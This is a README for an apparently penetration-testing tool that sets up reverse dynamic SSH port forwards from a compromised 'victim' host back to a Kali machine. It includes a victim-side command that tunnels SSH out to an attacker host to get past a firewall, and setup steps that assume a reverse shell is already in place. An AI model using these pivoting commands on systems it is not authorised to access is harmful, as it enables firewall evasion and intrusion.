# reverse-dynamic-port-forward
This is a simple script to make it easier to create reverse dynamic port forwards with SSH. 

If SSH is allowed inbound on the victim, you don't need to use this. You can perform a standard (forward) dynamic port forward from kali to the victim.

If SSH is not allowed inbound,  you can use this script to more easily provision and destroy a temporary user for a reverse connection.

### Workarounds for older ssh client versions

Reverse dynamic port forwarding with -R requires OpenSSH 7.6 on the victim. 

If your victim has a lower OpenSSH client version, but is running an SSH server protected by a firewall, you can still work around that to do dynamic port forwarding.
On the victim, you can create a reverse port forward from kali:someport to victim:22 so that kali can access the victim's SSH server from localhost:someport.
Then, on kali, you can do a standard dynamic port forward on localhost:someport which bypasses the firewall through the SSH tunnel to reach victim:22

```
victim:~$ ssh -fNR 1337:127.0.0.1:22 hacker@kali
kali:~$ ssh -fND 9050 -p 1337 victim@127.0.0.1
```

## Setup

Run the script on kali.

![](./doc-images/setup1.png)

Create a reverse shell from the debian server to kali.

![](./doc-images/setup2.png)

From the reverse shell, copy and paste the command generated by the script.

![](./doc-images/setup3.png)

## Example 1: connections to kali will go through debian
![](./doc-images/proof1-1.png)
![](./doc-images/proof1-2.png)

## Example 2: connections to localhost will go to debian

![](./doc-images/proof2-1.png)
![](./doc-images/proof2-2.png)

## Cleanup

The script automatically kills all processes from the temporary user and then deletes it.

![](./doc-images/cleanup.png)
